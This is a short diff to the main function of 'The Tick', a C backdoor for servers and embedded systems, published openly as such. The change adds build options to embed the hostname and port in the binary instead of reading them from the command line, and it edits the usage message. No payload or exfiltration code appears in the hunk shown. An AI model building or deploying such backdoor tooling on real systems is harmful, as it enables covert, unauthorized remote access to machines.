@@ -36,19 +36,30 @@ int main(int argc, char *argv[])
 
     // Command line arguments are the hostname and port.
     Settings s;
+#if TICK_CONFIG_USE_ARGV
     get_configuration(&s, argc, argv);
+#else
+    get_configuration(&s);
+#endif
 
-    // If we don't have a hostname to connect to, quit.
-    if (s.hostname[0] == 0) {
+    // If we don't have a hostname and port to connect to, quit.
+    if (s.hostname[0] == 0 || s.port == 0) {
         LOG("\n"
             "The Tick, a simple backdoor for servers and embedded systems.\n"
+            "           https://github.com/MarioVilas/thetick\n"
+#if TICK_CONFIG_USE_ARGV
             "\n"
             "Usage:\n"
+#ifdef TICK_CONFIG_PORT
             "\t%s <hostname> [port]\n"
+#else
+            "\t%s <hostname> <port>\n"
+#endif
+#endif
             "\n"
             "This is the backdoor component. If you're seeing this and you\n"
             "  didn't install it yourself, I've got bad news for you...\n"
-            "\n", argv[0]);
+            "\n", basename(argv[0]));
         return 1;
     }
 
